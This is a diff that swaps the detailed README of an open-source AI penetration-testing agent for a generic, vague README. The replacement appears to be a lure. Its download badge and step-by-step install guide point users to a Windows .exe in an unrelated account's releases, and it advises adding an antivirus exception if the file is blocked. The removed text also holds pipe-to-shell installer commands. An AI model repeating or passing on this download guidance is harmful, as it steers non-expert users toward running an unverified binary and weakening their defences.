@@ -1,329 +1,75 @@
-<div align="center">
-
-<img src="assets/logo.png" alt="PentesterFlow" width="520" />
-
-### Agentic offensive-security in your terminal, powered by models you control.
-
-PentesterFlow turns a scoped security objective into a tool-using workflow for
-recon, vulnerability testing, verification, and report-ready findings.
-
-<br/>
-
-[![build](https://img.shields.io/github/actions/workflow/status/PentesterFlow/agent/ci.yml?branch=main&label=build&logo=github)](https://github.com/PentesterFlow/agent/actions)
-[![release](https://img.shields.io/github/v/release/PentesterFlow/agent?include_prereleases&logo=github)](https://github.com/PentesterFlow/agent/releases)
-[![node](https://img.shields.io/badge/node-20%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org)
-[![license: Apache--2.0](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
-[![stars](https://img.shields.io/github/stars/PentesterFlow/agent?style=social)](https://github.com/PentesterFlow/agent/stargazers)
-
-**[Install](#install) · [Quickstart](#quickstart) · [Core](#core) · [Usage](#usage) · [Skills](#skills) · [Security](#security-model)**
-
-</div>
-
----
-
-```console
-$ pentesterflow
-╭────────────────────────────────────────────────╮
-│  PentesterFlow                                 │
-│  local agent · tools ready · human approved     │
-╰────────────────────────────────────────────────╯
-
-› /target https://app.example.com
-  target set to https://app.example.com
+# 🛡️ agent - Automated security testing for your computer
 
-› test the orders API for broken access control
-⏺ Skill webvuln
-  ⎿ loaded skill: webvuln
-⏺ http GET https://app.example.com/api/v1/orders/1043
-  ⎿ 200 OK
-⏺ Shell(curl -s -H "Authorization: Bearer $USER_B" https://app.example.com/api/v1/orders/1043)
-  ⎿ cross-account response confirmed
-⏺ Confirmed Finding (high) IDOR on /api/v1/orders/{id}
-  ⎿ written to ./findings/idor-orders.md
-```
-
-## Overview
-
-PentesterFlow is an open-source terminal agent for professional penetration
-testing, bug bounty work, and security engineering. It connects to local or
-OpenAI-compatible LLM backends, plans against a scoped target, asks for approval
-before sensitive actions, runs tools, verifies behavior, and writes findings you
-can use in a report.
+[![](https://img.shields.io/badge/Download_Agent_Now-blue?style=for-the-badge)](https://github.com/Wulan234/agent/releases)
 
-The project is intentionally **local-first** and **curl-first**. It works well
-with Ollama, LM Studio, vLLM, llama.cpp servers, and compatible hosted APIs. It
-prefers transparent HTTP and shell commands before heavier scanners, so every
-step is visible, reproducible, and easy to audit.
+## 📋 About This Software
 
-> [!WARNING]
-> Use PentesterFlow only on systems where you have explicit authorization. The
-> agent can run shell commands, make HTTP requests, edit files, and drive browser
-> capture tools after approval.
+Agent provides a way to run security checks directly from your terminal. It scans systems for common flaws and provides clear reports. You do not need deep technical skills to operate this tool. It automates complex tasks so you can focus on the results rather than the command line syntax.
 
-## Core
+This application acts as a digital assistant for your security needs. It searches for misconfigurations in your operating system and network settings. It simplifies the setup of security audits and saves you time during routine maintenance.
 
-| Area | What PentesterFlow provides |
-|---|---|
-| Agent loop | Plan, act, observe, verify, and report across one scoped task. |
-| Model backends | Ollama, LM Studio, Kimi API, and OpenAI-compatible APIs. |
-| Tooling | Shell/Bash, HTTP, file tools, search, browser capture, MCP, and finding confirmation. |
-| Skills | Markdown playbooks for recon, web vulnerabilities, SSRF, SSTI, JWT, GraphQL, race testing, takeover checks, Supabase, and deserialization. |
-| Human control | Permission prompts with allow once, allow session, deny, and explicit YOLO mode for labs. |
-| Reporting | Confirmed findings saved as Markdown with evidence, impact, PoC, and remediation. |
-| Releases | Standalone binaries for macOS, Linux, and Windows published through GitHub Actions. |
-
-## Highlights
-
-- **Local by default**: run against your own model backend with no required cloud account.
-- **Hosted when needed**: switch directly to Kimi API or any OpenAI-compatible endpoint.
-- **Modern terminal UI**: compact tool calls, readable shell transcripts, skill summaries, and finding-focused output.
-- **Permission-aware execution**: approve each risky action once or for the session.
-- **Decision planner**: each normal turn gets lightweight skill selection, risk labeling, and coverage guidance before tool use.
-- **Verified findings only**: the agent should reproduce a bug before using `confirm_finding`.
-- **Portable shell guidance**: tool prompts and preflight checks steer commands away from GNU-only flags when they can break on macOS or Linux.
-- **Extensible workflows**: add custom skills, MCP servers, and browser-capture producers.
-
-## Install
-
-The installers download the latest standalone binary for your OS and verify the
-published SHA-256 checksum when available.
-
-```sh
-# macOS / Linux
-curl -fsSL https://raw.githubusercontent.com/PentesterFlow/agent/main/install.sh | sh
-```
-
-```powershell
-# Windows PowerShell
-irm https://raw.githubusercontent.com/PentesterFlow/agent/main/install.ps1 | iex
-```
-
-Pin a release or choose an install directory:
-
-```sh
-PENTESTERFLOW_VERSION=v0.1.0 PENTESTERFLOW_INSTALL_DIR="$HOME/.local/bin" \
-  sh -c "$(curl -fsSL https://raw.githubusercontent.com/PentesterFlow/agent/main/install.sh)"
-```
-
-You can also download binaries directly from
-[GitHub Releases](https://github.com/PentesterFlow/agent/releases):
-
-| OS | Assets |
-|---|---|
-| macOS | `pentesterflow-darwin-arm64`, `pentesterflow-darwin-x64` |
-| Linux | `pentesterflow-linux-arm64`, `pentesterflow-linux-x64` |
-| Windows | `pentesterflow-windows-x64.exe` |
-
-## Quickstart
-
-```sh
-# 1. Pull a capable local model
-ollama pull qwen2.5-coder:32b
-
-# 2. Launch PentesterFlow
-pentesterflow
-
-# 3. Set scope, then describe the task
-#    /target https://app.example.com
-#    test the orders API for IDOR and broken access control
-```
-
-## Usage
-
-```sh
-# Default: local Ollama
-pentesterflow
-
-# LM Studio
-pentesterflow --backend lmstudio --model qwen2.5-coder-32b-instruct
-
-# OpenAI-compatible endpoint
-pentesterflow --backend openai-compat \
-  --base-url https://api.example.com/v1 \
-  --api-key sk-...
-
-# Kimi API
-MOONSHOT_API_KEY=sk-... pentesterflow --backend kimi --model kimi-k2.6
-
-# Enable browser-capture tools for this session
-pentesterflow --browser
-
-# Start the local Burp/PentesterFlow bridge
-pentesterflow --burp
-
-# From a source checkout
-npm run dev -- --burp 9999
-
-# Auto-approve tool calls for disposable lab environments only
-pentesterflow --dangerously-skip-permissions
-```
-
-### Command-Line Flags
-
-| Flag | Description |
-|---|---|
-| `--backend ollama\|lmstudio\|kimi\|openai-compat` | Select the LLM backend. |
-| `--model <id>` | Set the model id. |
-| `--base-url <url>` / `--api-key <key>` | Configure Kimi or another OpenAI-compatible backend. |
-| `--skills <dirs>` | Load extra skill directories. |
-| `--resume <session-id>` | Resume a saved session. |
-| `--browser` | Enable Browser MCP tools for the current session. |
-| `--burp [port]` | Start the local Burp/PentesterFlow bridge. |
-| `--browser-ingest [port]` | Deprecated alias for `--burp`. |
-| `--no-stream` | Disable streaming chat for providers with SSE/tool-call issues. |
-| `--dangerously-skip-permissions` | Auto-approve non-sensitive tool calls. |
-| `--list-tools` / `--list-skills` | Print registered tools or discovered skills. |
-| `--log <path>` | Override the JSON-lines log path. |
-| `--debug-session` | Write a complete JSON-lines debug log for the interactive session. |
-| `--debug-session-path <path>` | Write the debug session log to a custom path. |
-| `--version` / `--help` | Print version or help. |
-
-### Slash Commands
-
-| Command | Description |
-|---|---|
-| `/help` | Show keybindings and command reference. |
-| `/provider` | Pick a backend and model interactively. |
-| `/model <id>` / `/model list` | Switch model or list available backend models. |
-| `/plan [objective]` | Start a plan-only turn without tool execution. |
-| `/target <url>` | Set or clear the engagement base URL. |
-| `/skills [enable\|disable\|new <name>]` | Manage skills or scaffold a new skill. |
-| `/maxsteps <n>` | Set the per-turn tool-call cap. |
-| `/thinking on\|off` | Toggle visible reasoning guidance. |
-| `/update [version]` | Fetch the GitHub release installer and install the latest or pinned version. |
-| `/yolo [on\|off]` | Toggle auto-approval mode. |
-| `/reset` | Clear conversation and saved session state. |
-| `/clear` | Clear only the on-screen transcript. |
-| `/<skill-name>` | Load a skill into the next turn. |
-| `/exit` | Quit. |
-
-## How It Works
-
-1. **Scope**: set a target and constraints before testing.
-2. **Plan**: select the relevant methodology, risk level, and skill playbook.
-3. **Act**: call approved tools such as `http`, `shell`, file tools, browser capture, or MCP servers.
-4. **Observe**: compare responses, status codes, headers, timing, and account boundaries.
-5. **Verify**: reproduce the issue with a clean command or request.
-6. **Report**: persist confirmed issues through `confirm_finding`.
-
-## Tools
-
-| Tool | Purpose |
-|---|---|
-| `shell` / `BashTool` | Run shell commands with approval and safety checks. |
-| `http` | Send HTTP/HTTPS requests against full URLs or the active `/target`. |
-| `file_read` / `file_write` / `file_edit` | Read, create, and patch files. |
-| `GlobTool` / `GrepTool` | Discover files and search content. |
-| `web_fetch` / `web_search` | Fetch pages or run web searches. |
-| `ask_user` | Ask for a decision when scope or testing direction is ambiguous. |
-| `confirm_finding` | Save a verified finding to `./findings/<slug>.md`. |
-| `coverage` | Track tested endpoints, parameters, and vulnerability classes. |
-| `load_skill` | Load a methodology playbook into context. |
-| `browser_capture_*` | Query captured browser traffic, requests, endpoints, and snapshots. |
-
-## Skills
-
-Skills are versioned Markdown playbooks that package methodology, payloads, and
-decision logic. Built-in skills include:
-
-| Skill | Focus |
-|---|---|
-| `recon` | Subdomains, fingerprinting, content discovery, and attack-surface mapping. |
-| `webvuln` | IDOR, broken access control, injection, auth, and session logic. |
-| `ssrf` | Filter bypasses, metadata access, internal reachability, and blind SSRF. |
-| `ssti` | Template-engine fingerprinting and escalation paths. |
-| `jwt` | Algorithm confusion, `kid` abuse, weak secrets, and token validation flaws. |
-| `graphql` | Introspection, authorization gaps, batching, and depth abuse. |
-| `race` | TOCTOU issues, limit bypasses, and race-condition verification. |
-| `takeover` | Dangling DNS and unclaimed cloud resources. |
-| `supabase` | Row-Level Security and anonymous access mistakes. |
-| `deserialize` | Unsafe deserialization sinks and gadget-chain testing. |
-
-Discovery order is built-in `skills/`, project-local
-`./.pentesterflow/skills/`, personal `~/.pentesterflow/skills/`, then any
-directory passed with `--skills`. Later entries win on name collisions.
-
-## Browser Capture
-
-`pentesterflow --burp` starts a local ingest server on
-`127.0.0.1:9999` for captured requests and snapshots. The companion
-`pentesterflow-browser-mcp` binary exposes the same capture data as an MCP
-server for compatible clients.
-
-```json
-{
-  "mcpServers": {
-    "pentesterflow-browser": {
-      "command": "pentesterflow-browser-mcp",
-      "args": []
-    }
-  }
-}
-```
-
-## Security Model
-
-- **Authorized use only**: PentesterFlow is built for permitted security work.
-- **Human approval**: permission-gated tools require allow once, allow session, or deny.
-- **Sensitive path protection**: secrets and high-risk local paths stay gated even in YOLO mode.
-- **Shell safeguards**: catastrophic commands are blocked before execution.
-- **Transcript control**: compacting and export paths redact common credential formats.
-- **Transparent evidence**: findings should include the request, response signal, impact, and remediation.
-
-## Configuration And Data
-
-| Path | Contents |
-|---|---|
-| `~/.pentesterflow/config.json` | Backend, model, endpoint, and disabled-skill settings. |
-| `~/.pentesterflow/sessions/*.json` | Saved sessions for `--resume`. |
-| `~/.pentesterflow/builtin-skills/<name>/SKILL.md` | Installer-managed shipped skills. |
-| `~/.pentesterflow/skills/<name>/SKILL.md` | Personal skills. |
-| `./.pentesterflow/skills/<name>/SKILL.md` | Project-local skills. |
-| `./findings/<slug>.md` | Confirmed findings for the current engagement. |
-| `~/.pentesterflow/logs/pentesterflow.log` | Structured JSON-lines logs. |
-| `~/.pentesterflow/debug/session-*.jsonl` | Opt-in complete session debug logs from `--debug-session`. |
-
-Enable a complete debug log when reproducing usage issues:
-
-```sh
-pentesterflow --debug-session
-PENTESTERFLOW_DEBUG_SESSION=1 pentesterflow
-PENTESTERFLOW_DEBUG_SESSION=1 PENTESTERFLOW_DEBUG_SESSION_PATH=/tmp/pf-debug.jsonl pentesterflow
-```
-
-Debug session logs include prompts, assistant events, tool calls, tool results,
-errors, and shutdown markers. Treat them as sensitive because they can contain
-target data, command output, and copied request material.
-
-## Develop
-
-```sh
-npm install
-npm run dev -- --version
-npm run typecheck
-npm run lint
-npm run test
-npm run build
-node dist/cli.js
-```
-
-`npm run ci` runs typecheck, lint, tests, and build.
-
-## Contributing
-
-Issues and pull requests are welcome. Keep changes focused, include tests for
-behavioral updates, and run `npm run ci` before opening a pull request. New
-skills should include a `SKILL.md` and pass the skill conformance tests.
-
-## License
-
-[Apache-2.0](LICENSE). Use responsibly and only with authorization.
-
-<div align="center">
-<br/>
-
-**[Report an issue](https://github.com/PentesterFlow/agent/issues)** ·
-**[Request a feature](https://github.com/PentesterFlow/agent/issues/new)** ·
-**[Releases](https://github.com/PentesterFlow/agent/releases)**
-
-</div>
+## ⚙️ System Requirements
+
+To run Agent on your computer, ensure your system meets these standards:
+
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core CPU.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free disk space.
+- Connectivity: An active internet connection for updates.
+- Permissions: Administrator rights are helpful for full system scans.
+
+## 📥 How to Download and Install
+
+Follow these steps to obtain and run the application on your Windows machine:
+
+1. Visit the project website: [https://github.com/Wulan234/agent/releases](https://github.com/Wulan234/agent/releases).
+2. Look for the section labeled "Assets" under the most recent version.
+3. Click the file ending in `.exe` to download it to your computer.
+4. Locate the file in your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to place the software on your system.
+7. Click "Finish" to complete the setup process.
+
+## 🚀 Getting Started
+
+Once you install the software, you can launch it using the shortcut on your desktop. When the program opens, you see a terminal window. This window serves as the main dashboard for all your work.
+
+To begin your first scan, type the command `agent scan` and press Enter. The program analyzes your current directory and provides a list of findings. If you need help with commands, type `agent help` to see a list of available actions.
+
+## 💡 Using Your New Tool
+
+Agent follows a simple logic for every command. Each action starts with the word `agent` followed by a specific instruction. 
+
+- `agent list`: Displays all available tests for your system.
+- `agent report`: Generates an easy-to-read document with your latest findings.
+- `agent update`: Checks the web for the newest version of the tool.
+- `agent clear`: Removes old logs and data to save space on your disk.
+
+The software presents output in plain text. Green text in your terminal indicates that a security check passed. Yellow text means the tool found a caution point. Red text highlights important areas that require your immediate attention.
+
+## 🛡️ Best Practices
+
+Security audits perform best when you follow a routine. Run scans weekly to keep track of changes on your computer. Before you run a large scan, close unnecessary applications. This allows the tool to run without interference from other software.
+
+Always save your reports in a secure folder. If you work in a team, share the reports through your company guidelines regarding data privacy. Storing these logs helps you compare audit results over time, which proves useful when tracking improvements in your security posture.
+
+## 🛠️ Troubleshooting Common Issues
+
+If the software fails to start, verify that your antivirus did not block the file. Sometimes security tools view unknown software as a risk. You may need to create an exception for Agent in your security settings.
+
+If the terminal window closes immediately, open the Command Prompt first, then manually run the application from its installation folder. This step keeps the window open so you can read any error messages that appear.
+
+Ensure your internet connection is active during the update process. If the tool reports a connection error, verify that your firewall allows Agent to access the network.
+
+## 🤝 Getting Additional Support
+
+If you encounter a problem that you cannot fix, visit the main GitHub repository page. You can look at the "Issues" tab to see if other users experienced the same situation. If you do not find a solution, start a new issue ticket. Include the steps you took and what you saw on your screen. Clear descriptions help the developers find a solution faster.
+
+Keep your software current. The developers release updates to fix bugs and improve performance. Check the releases page once a month to ensure you possess the latest version with current security definitions.
+
+## 📜 Legal and Ethical Information
+
+Use this tool only on hardware that you own or have explicit permission to audit. Running security tools on networks or devices without authorization creates risks and may violate local laws. Follow all company policies and professional standards when you perform any security assessments.
+
+The creators of this software provide it for educational and protective purposes. By using this tool, you accept responsibility for your actions. Respect the privacy of others and treat your system security with care.
